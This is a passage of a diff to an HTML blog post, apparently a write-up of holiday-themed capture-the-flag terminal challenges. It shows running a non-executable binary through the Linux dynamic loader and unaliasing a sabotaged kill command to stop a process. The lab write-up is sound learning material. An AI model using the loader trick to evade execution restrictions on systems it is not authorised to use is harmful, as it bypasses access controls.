-</span><span style=""> </span><span style="color:#ae81ff">\_</span><span style="">__</span><span style="">|</span><span style="">_</span><span style="">|</span><span style="">_</span><span style="">|</span><span style="">  </span><span style="color:#ae81ff">\_</span><span style="">_</span><span style="color:#ae81ff">\_</span><span style="">_,_</span><span style="">|</span><span style="">_</span><span style="">|</span><span style="">_</span><span style="">|</span><span style="color:#ae81ff">\_\_</span><span style="">_,_</span><span style="">|</span><span style="">
-</span><span style="">-*&gt; elftalkd! &lt;*-
-</span><span style="">Version </span><span style="color:#ae81ff">9000</span><span style="">.1 </span><span style="color:#f92672">(</span><span style="">Build </span><span style="color:#ae81ff">31337</span><span style="color:#f92672">)</span><span style=""> 
-</span><span style="">By Santa Claus </span><span style="">&amp;</span><span style=""> The Elf Team
-</span><span style="">Copyright </span><span style="color:#f92672">(</span><span style="">C</span><span style="color:#f92672">)</span><span style=""> </span><span style="color:#ae81ff">2017</span><span style=""> NotActuallyCopyrighted. No actual rights reserved.
-</span><span style="">Using libc6 version </span><span style="color:#ae81ff">2</span><span style="">.23-0ubuntu9
-</span><span style=""></span><span style="">LANG</span><span style=""></span><span style="color:#f92672">=</span><span style="">en_US.UTF-8
-</span><span style=""></span><span style="">Timezone</span><span style=""></span><span style="color:#f92672">=</span><span style="">UTC
-</span><span style="">Commencing Elf Talk Daemon </span><span style="color:#f92672">(</span><span style="">pid</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#ae81ff">6021</span><span style="color:#f92672">)</span><span style="">... </span><span style="color:#66d9ef">done</span><span style="">!
-</span><span style="">Background daemon...</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@466dc314ba46:~$ /run/elftalk/bin/elftalkd 
+        Running in interactive mode
+        --== Initializing elftalkd ==--
+Initializing Messaging System!
+Nice-O-Meter configured to 0.90 sensitivity.
+Acquiring messages from local networks...
+--== Initialization Complete ==--
+      _  __ _        _ _       _ 
+     | |/ _| |      | | |     | |
+  ___| | |_| |_ __ _| | | ____| |
+ / _ \ |  _| __/ _` | | |/ / _` |
+|  __/ | | | || (_| | |   &lt; (_| |
+ \___|_|_|  \__\__,_|_|_|\_\__,_|
+-*&gt; elftalkd! &lt;*-
+Version 9000.1 (Build 31337) 
+By Santa Claus &amp; The Elf Team
+Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
+Using libc6 version 2.23-0ubuntu9
+LANG=en_US.UTF-8
+Timezone=UTC
+Commencing Elf Talk Daemon (pid=6021)... done!
+Background daemon...
+</code></pre>
+
 <h2 id="cryokinetic-magic">CRYOKINETIC MAGIC</h2>
 
 <h3 id="candy-cane-striper">Candy Cane Striper</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                     ___
-</span><span style="">                    / __</span><span style="color:#e6db74">&#39;.     .-&#34;&#34;&#34;-.
-</span><span style="color:#e6db74">              .-&#34;&#34;-| |  &#39;</span><span style="">.</span><span style="color:#e6db74">&#39;.  / .---. \
-</span><span style="color:#e6db74">             / .--. \ \___\ \/ /____| |
-</span><span style="color:#e6db74">            / /    \ `-.-;-(`_)_____.-&#39;</span><span style="">._
-</span><span style="">           </span><span style="">;</span><span style=""> </span><span style="">;</span><span style="">      </span><span style="color:#e6db74">`</span><span style="">.-</span><span style="color:#e6db74">&#34; &#34;</span><span style="">-:_,</span><span style="color:#f92672">(</span><span style="">o:</span><span style="color:#f92672">==</span><span style="">..</span><span style="color:#e6db74">`</span><span style="">-. </span><span style="color:#e6db74">&#39;.         .-&#34;-,
-</span><span style="color:#e6db74">           | |      /       \ /      `\ `. \       / .-. \
-</span><span style="color:#e6db74">           \ \     |         Y    __...\  \ \     / /   \/
-</span><span style="color:#e6db74">     /\     | |    | .--&#34;&#34;--.| .-&#39;</span><span style="">      </span><span style="color:#ae81ff">\ </span><span style=""> </span><span style="color:#e6db74">&#39;.`---&#39;</span><span style=""> /
-</span><span style="">     </span><span style="color:#ae81ff">\ \ </span><span style="">  / /     </span><span style="">|</span><span style="color:#e6db74">`</span><span style="">        </span><span style="color:#ae81ff">\&#39;</span><span style="">   _...--.</span><span style="">;</span><span style="">   </span><span style="color:#e6db74">&#39;---&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">      </span><span style="color:#ae81ff">\ </span><span style="color:#e6db74">&#39;-&#39;</span><span style=""> / jgs  /_..---.._ </span><span style="color:#ae81ff">\ </span><span style="">.</span><span style="color:#e6db74">&#39;\\_     `.
-</span><span style="color:#e6db74">       `--&#39;</span><span style="color:#e6db74">`</span><span style="">      .</span><span style="color:#e6db74">&#39;    (_)  `&#39;</span><span style="">/   </span><span style="color:#f92672">(</span><span style="">_</span><span style="color:#f92672">)</span><span style="">     /
-</span><span style="">                  </span><span style="color:#e6db74">`</span><span style="">._       _.</span><span style="color:#e6db74">&#39;|         .&#39;</span><span style="">
-</span><span style="">                     </span><span style="color:#e6db74">```````</span><span style="">    </span><span style="color:#e6db74">&#39;-...--&#39;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">My name is Holly Evergreen, and I have a conundrum.
-</span><span style="">I broke the candy cane striper, and I</span><span style="color:#e6db74">&#39;m near throwing a tantrum.
-</span><span style="color:#e6db74">Assembly lines have stopped since the elves can&#39;</span><span style="">t get their candy cane fix.
-</span><span style="">We hope you can start the striper once again, with your vast bag of tricks.
-</span><span style="">Run the CandyCaneStriper executable to </span><span style="">complete</span><span style=""> this challenge.</span></code></pre>
-</div>
+
+<pre><code class="language-bash">                     ___
+                    / __'.     .-&quot;&quot;&quot;-.
+              .-&quot;&quot;-| |  '.'.  / .---. \
+             / .--. \ \___\ \/ /____| |
+            / /    \ `-.-;-(`_)_____.-'._
+           ; ;      `.-&quot; &quot;-:_,(o:==..`-. '.         .-&quot;-,
+           | |      /       \ /      `\ `. \       / .-. \
+           \ \     |         Y    __...\  \ \     / /   \/
+     /\     | |    | .--&quot;&quot;--.| .-'      \  '.`---' /
+     \ \   / /     |`        \'   _...--.;   '---'`
+      \ '-' / jgs  /_..---.._ \ .'\\_     `.
+       `--'`      .'    (_)  `'/   (_)     /
+                  `._       _.'|         .'
+                     ```````    '-...--'`
+My name is Holly Evergreen, and I have a conundrum.
+I broke the candy cane striper, and I'm near throwing a tantrum.
+Assembly lines have stopped since the elves can't get their candy cane fix.
+We hope you can start the striper once again, with your vast bag of tricks.
+Run the CandyCaneStriper executable to complete this challenge.
+</code></pre>
+
 <p>This time we are prompted to run a binary. It has no <code>execute</code> permission and we cannot set this permission for the binary as well.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@b83c138c0b53:~$ ls -la
-</span><span style="">total </span><span style="color:#ae81ff">68</span><span style="">
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> elf  elf   </span><span style="color:#ae81ff">4096</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">20</span><span style="">:00 .
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">5</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:31 ..
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">220</span><span style=""> Aug </span><span style="color:#ae81ff">31</span><span style="">  </span><span style="color:#ae81ff">2015</span><span style=""> .bash_logout
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">3143</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 .bashrc
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">655</span><span style=""> May </span><span style="color:#ae81ff">16</span><span style="">  </span><span style="color:#ae81ff">2017</span><span style=""> .profile
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">45224</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 CandyCaneStriper
-</span><span style="">elf@b83c138c0b53:~$ chmod +x CandyCaneStriper 
-</span><span style="">elf@b83c138c0b53:~$ ls -la
-</span><span style="">total </span><span style="color:#ae81ff">68</span><span style="">
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> elf  elf   </span><span style="color:#ae81ff">4096</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">20</span><span style="">:00 .
-</span><span style="">drwxr-xr-x </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">4096</span><span style=""> Dec  </span><span style="color:#ae81ff">5</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:31 ..
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">220</span><span style=""> Aug </span><span style="color:#ae81ff">31</span><span style="">  </span><span style="color:#ae81ff">2015</span><span style=""> .bash_logout
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root  </span><span style="color:#ae81ff">3143</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 .bashrc
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> elf  elf    </span><span style="color:#ae81ff">655</span><span style=""> May </span><span style="color:#ae81ff">16</span><span style="">  </span><span style="color:#ae81ff">2017</span><span style=""> .profile
-</span><span style="">-rw-r--r-- </span><span style="color:#ae81ff">1</span><span style=""> root root </span><span style="color:#ae81ff">45224</span><span style=""> Dec </span><span style="color:#ae81ff">15</span><span style=""> </span><span style="color:#ae81ff">19</span><span style="">:59 CandyCaneStriper</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@b83c138c0b53:~$ ls -la
+total 68
+drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
+drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
+-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
+-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
+-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
+elf@b83c138c0b53:~$ chmod +x CandyCaneStriper 
+elf@b83c138c0b53:~$ ls -la
+total 68
+drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 .
+drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
+-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 root root  3143 Dec 15 19:59 .bashrc
+-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
+-rw-r--r-- 1 root root 45224 Dec 15 19:59 CandyCaneStriper
+</code></pre>
+
 <p>Refer to the tweet from Holly the Elf, I found a hint to the solution:
 <code>https://twitter.com/GreenesterElf/status/938542480487677952</code>
 This is a 64-bit machine, so we need to find the linker at <code>/lib64/ld-linux-x86-64.so.2</code>. Let&rsquo;s try this out:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@b83c138c0b53:~$ /lib64/ld-linux-x86-64.so.2 /home/elf/CandyCaneStriper 
-</span><span style="">                   _..._
-</span><span style="">                 .</span><span style="color:#e6db74">&#39;\\ //`,      
-</span><span style="color:#e6db74">                /\\.&#39;</span><span style="color:#e6db74">``</span><span style="color:#e6db74">&#39;.=&#34;,
-</span><span style="color:#e6db74">               / \/     ;==|
-</span><span style="color:#e6db74">              /\\/    .&#39;</span><span style="color:#ae81ff">\`</span><span style="">,</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">             / </span><span style="color:#ae81ff">\/</span><span style="">     </span><span style="color:#e6db74">`</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">            /</span><span style="color:#ae81ff">\\</span><span style="">/
-</span><span style="">           /</span><span style="color:#ae81ff">\\</span><span style="">/
-</span><span style="">          /</span><span style="color:#ae81ff">\ </span><span style="">/
-</span><span style="">         /</span><span style="color:#ae81ff">\\</span><span style="">/
-</span><span style="">        /</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\/</span><span style="">
-</span><span style="">        </span><span style="color:#ae81ff">\\</span><span style="">/
-</span><span style="">         </span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">The candy cane striping machine is up and running!</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@b83c138c0b53:~$ /lib64/ld-linux-x86-64.so.2 /home/elf/CandyCaneStriper 
+                   _..._
+                 .'\\ //`,      
+                /\\.'``'.=&quot;,
+               / \/     ;==|
+              /\\/    .'\`,`
+             / \/     `&quot;&quot;`
+            /\\/
+           /\\/
+          /\ /
+         /\\/
+        /`\/
+        \\/
+         `
+The candy cane striping machine is up and running!
+</code></pre>
+
 <h2 id="winconceivable-the-cliffs-of-winsanity">WINCONCEIVABLE: THE CLIFFS OF WINSANITY</h2>
 
 <h3 id="the-troublesome-process-termination">The troublesome process termination</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">                ___,@
-</span><span style="">               /  &lt;
-</span><span style="">          ,_  /    </span><span style="color:#ae81ff">\ </span><span style=""> _,
-</span><span style="">      ?    </span><span style="color:#ae81ff">\`</span><span style="">/______</span><span style="color:#ae81ff">\`</span><span style="">/
-</span><span style="">   ,_</span><span style="color:#f92672">(</span><span style="">_</span><span style="color:#f92672">)</span><span style="">.  </span><span style="">|;</span><span style=""> </span><span style="color:#f92672">(</span><span style="">e  e</span><span style="color:#f92672">)</span><span style=""> </span><span style="">;|</span><span style="">
-</span><span style="">    </span><span style="color:#ae81ff">\_</span><span style="">__ </span><span style="color:#ae81ff">\ \/\ </span><span style="">  </span><span style="color:#ae81ff">7</span><span style="">  /</span><span style="color:#ae81ff">\/</span><span style="">    _</span><span style="color:#ae81ff">\8</span><span style="">/_
-</span><span style="">        </span><span style="color:#ae81ff">\/\ </span><span style="">  </span><span style="color:#ae81ff">\&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;/      | /| /|
-</span><span style="color:#e6db74">         \ \___)--(_______|//|//|
-</span><span style="color:#e6db74">          \___  ()  _____/|/_|/_|
-</span><span style="color:#e6db74">             /  ()  \    `----&#39;</span><span style="">
-</span><span style="">            /   </span><span style="color:#f92672">()</span><span style="">   </span><span style="color:#ae81ff">\
-</span><span style="color:#ae81ff"></span><span style="">           </span><span style="color:#e6db74">&#39;-.______.-&#39;</span><span style="">
-</span><span style="">   jgs   _    </span><span style="">|</span><span style="">_</span><span style="color:#f92672">||</span><span style="">_</span><span style="">|</span><span style="">    _
-</span><span style="">        </span><span style="color:#f92672">(</span><span style="">@____</span><span style="color:#f92672">)</span><span style=""> </span><span style="color:#f92672">||</span><span style=""> </span><span style="color:#f92672">(</span><span style="">____@</span><span style="color:#f92672">)</span><span style="">
-</span><span style="">         </span><span style="color:#ae81ff">\_</span><span style="">_____</span><span style="color:#f92672">||</span><span style="">______/
-</span><span style="">My name is Sparkle Redberry, and I need your help.
-</span><span style="">My server is atwist, and I fear I may yelp.
-</span><span style="">Help me </span><span style="">kill</span><span style=""> the troublesome process gone awry.
-</span><span style="">I will </span><span style="color:#66d9ef">return</span><span style=""> the favor with a gift before nigh.</span></code></pre>
-</div>
+
+<pre><code class="language-bash">                ___,@
+               /  &lt;
+          ,_  /    \  _,
+      ?    \`/______\`/
+   ,_(_).  |; (e  e) ;|
+    \___ \ \/\   7  /\/    _\8/_
+        \/\   \'=='/      | /| /|
+         \ \___)--(_______|//|//|
+          \___  ()  _____/|/_|/_|
+             /  ()  \    `----'
+            /   ()   \
+           '-.______.-'
+   jgs   _    |_||_|    _
+        (@____) || (____@)
+         \______||______/
+My name is Sparkle Redberry, and I need your help.
+My server is atwist, and I fear I may yelp.
+Help me kill the troublesome process gone awry.
+I will return the favor with a gift before nigh.
+</code></pre>
+
 <p>Let&rsquo;s examine the running processes</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@f22c16457eec:~$ ps aux
-</span><span style="">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-</span><span style="">elf          </span><span style="color:#ae81ff">1</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">18028</span><span style="">  </span><span style="color:#ae81ff">2764</span><span style=""> pts/0    Ss   </span><span style="color:#ae81ff">06</span><span style="">:31   </span><span style="color:#ae81ff">0</span><span style="">:00 /bin/bash /sbin/init
-</span><span style="">elf          </span><span style="color:#ae81ff">8</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0   </span><span style="color:#ae81ff">4224</span><span style="">   </span><span style="color:#ae81ff">740</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /usr/bin/santaslittlehelperd
-</span><span style="">elf         </span><span style="color:#ae81ff">11</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.1  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">13528</span><span style="">  </span><span style="color:#ae81ff">6404</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /sbin/kworker
-</span><span style="">elf         </span><span style="color:#ae81ff">12</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">18248</span><span style="">  </span><span style="color:#ae81ff">3168</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /bin/bash
-</span><span style="">elf         </span><span style="color:#ae81ff">18</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.7  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">71468</span><span style=""> </span><span style="color:#ae81ff">26544</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /sbin/kworker
-</span><span style="">elf         </span><span style="color:#ae81ff">74</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">34424</span><span style="">  </span><span style="color:#ae81ff">2860</span><span style=""> pts/0    R+   </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 ps aux</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@f22c16457eec:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+elf          1  0.0  0.0  18028  2764 pts/0    Ss   06:31   0:00 /bin/bash /sbin/init
+elf          8  0.0  0.0   4224   740 pts/0    S    06:32   0:00 /usr/bin/santaslittlehelperd
+elf         11  0.1  0.0  13528  6404 pts/0    S    06:32   0:00 /sbin/kworker
+elf         12  0.0  0.0  18248  3168 pts/0    S    06:32   0:00 /bin/bash
+elf         18  0.7  0.0  71468 26544 pts/0    S    06:32   0:00 /sbin/kworker
+elf         74  0.0  0.0  34424  2860 pts/0    R+   06:32   0:00 ps aux
+</code></pre>
+
 <p>I then tried to kill the process using the <code>kill</code> command. I did used the wrong syntax but no error popped out and the process wasn&rsquo;t killed either.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@f22c16457eec:~$ </span><span style="">kill</span><span style=""> -9 pidof santaslittlehelperd
-</span><span style="">elf@f22c16457eec:~$ ps aux
-</span><span style="">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-</span><span style="">elf          </span><span style="color:#ae81ff">1</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">18028</span><span style="">  </span><span style="color:#ae81ff">2764</span><span style=""> pts/0    Ss   </span><span style="color:#ae81ff">06</span><span style="">:31   </span><span style="color:#ae81ff">0</span><span style="">:00 /bin/bash /sbin/init
-</span><span style="">elf          </span><span style="color:#ae81ff">8</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0   </span><span style="color:#ae81ff">4224</span><span style="">   </span><span style="color:#ae81ff">740</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /usr/bin/santaslittlehelperd
-</span><span style="">elf         </span><span style="color:#ae81ff">11</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.1  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">13528</span><span style="">  </span><span style="color:#ae81ff">6404</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /sbin/kworker
-</span><span style="">elf         </span><span style="color:#ae81ff">12</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">18248</span><span style="">  </span><span style="color:#ae81ff">3288</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /bin/bash
-</span><span style="">elf         </span><span style="color:#ae81ff">18</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.5  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">71468</span><span style=""> </span><span style="color:#ae81ff">26544</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /sbin/kworker
-</span><span style="">elf        </span><span style="color:#ae81ff">100</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">34424</span><span style="">  </span><span style="color:#ae81ff">2800</span><span style=""> pts/0    R+   </span><span style="color:#ae81ff">06</span><span style="">:33   </span><span style="color:#ae81ff">0</span><span style="">:00 ps aux</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@f22c16457eec:~$ kill -9 pidof santaslittlehelperd
+elf@f22c16457eec:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+elf          1  0.0  0.0  18028  2764 pts/0    Ss   06:31   0:00 /bin/bash /sbin/init
+elf          8  0.0  0.0   4224   740 pts/0    S    06:32   0:00 /usr/bin/santaslittlehelperd
+elf         11  0.1  0.0  13528  6404 pts/0    S    06:32   0:00 /sbin/kworker
+elf         12  0.0  0.0  18248  3288 pts/0    S    06:32   0:00 /bin/bash
+elf         18  0.5  0.0  71468 26544 pts/0    S    06:32   0:00 /sbin/kworker
+elf        100  0.0  0.0  34424  2800 pts/0    R+   06:33   0:00 ps aux
+</code></pre>
+
 <p>I then referred to the hint on Sparkle tweet: <code>alias</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@f22c16457eec:~$ </span><span style="">alias</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">alert</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;notify-send --urgency=low -i &#34;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&#34; &#34;$(history|tail -n1|sed -e &#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*ale
-</span><span style="color:#e6db74">rt$//&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;)&#34;&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">egrep</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;egrep --color=auto&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">fgrep</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fgrep --color=auto&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">grep</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;grep --color=auto&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">kill</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">killall</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">l</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -CF&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">la</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -A&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">ll</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -alF&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">ls</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls --color=auto&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">pkill</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span><span style="">
-</span><span style=""></span><span style="">alias</span><span style=""> </span><span style="">skill</span><span style=""></span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;true&#39;</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@f22c16457eec:~$ alias
+alias alert='notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*ale
+rt$//'\'')&quot;'
+alias egrep='egrep --color=auto'
+alias fgrep='fgrep --color=auto'
+alias grep='grep --color=auto'
+alias kill='true'
+alias killall='true'
+alias l='ls -CF'
+alias la='ls -A'
+alias ll='ls -alF'
+alias ls='ls --color=auto'
+alias pkill='true'
+alias skill='true'
+</code></pre>
+
 <p>So there was an alias of kill, making the command useless. I just needed to unalias these and kill the process easily</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="">elf@f22c16457eec:~$ </span><span style="">unalias</span><span style=""> -a
-</span><span style="">elf@f22c16457eec:~$ </span><span style="">alias</span><span style="">
-</span><span style="">elf@f22c16457eec:~$ </span><span style="">kill</span><span style=""> -9 </span><span style="color:#e6db74">`</span><span style="">pidof santaslittlehelperd</span><span style="color:#e6db74">`</span><span style="">
-</span><span style="">elf@f22c16457eec:~$ ps aux
-</span><span style="">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-</span><span style="">elf          </span><span style="color:#ae81ff">1</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">18028</span><span style="">  </span><span style="color:#ae81ff">2764</span><span style=""> pts/0    Ss   </span><span style="color:#ae81ff">06</span><span style="">:31   </span><span style="color:#ae81ff">0</span><span style="">:00 /bin/bash /sbin/init
-</span><span style="">elf         </span><span style="color:#ae81ff">12</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">18248</span><span style="">  </span><span style="color:#ae81ff">3288</span><span style=""> pts/0    S    </span><span style="color:#ae81ff">06</span><span style="">:32   </span><span style="color:#ae81ff">0</span><span style="">:00 /bin/bash
-</span><span style="">elf        </span><span style="color:#ae81ff">192</span><span style="">  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">0</span><span style="">.0  </span><span style="color:#ae81ff">34424</span><span style="">  </span><span style="color:#ae81ff">2912</span><span style=""> pts/0    R+   </span><span style="color:#ae81ff">06</span><span style="">:34   </span><span style="color:#ae81ff">0</span><span style="">:00 ps aux</span></code></pre>
-</div>
+
+<pre><code class="language-bash">elf@f22c16457eec:~$ unalias -a
+elf@f22c16457eec:~$ alias
+elf@f22c16457eec:~$ kill -9 `pidof santaslittlehelperd`
+elf@f22c16457eec:~$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+elf          1  0.0  0.0  18028  2764 pts/0    Ss   06:31   0:00 /bin/bash /sbin/init
+elf         12  0.0  0.0  18248  3288 pts/0    S    06:32   0:00 /bin/bash
